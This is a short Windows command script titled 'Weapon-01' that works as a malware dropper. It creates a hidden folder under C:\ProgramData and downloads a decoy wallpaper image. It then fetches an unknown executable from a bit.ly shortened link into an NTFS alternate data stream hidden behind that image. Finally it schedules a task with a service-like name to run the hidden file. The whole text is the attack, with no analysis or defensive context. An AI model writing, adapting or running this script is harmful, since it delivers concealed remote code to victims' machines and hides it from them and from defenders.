# Weapon-01

mkdir C:\ProgramData\.temp
[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'
curl https://wallpaperaccess.com/full/94002.jpg -o C:\ProgramData\.temp\94002.jpg
cmd /c "curl https://bit.ly/3sJgOjB -o C:\ProgramData\.temp\94002.jpg:services.exe"
schtasks /create /tn "services_free.exe" /tr C:\ProgramData\.temp\94002.jpg:services.exe /sc once /sd 25/12/2025 /st 15:00:00 /z
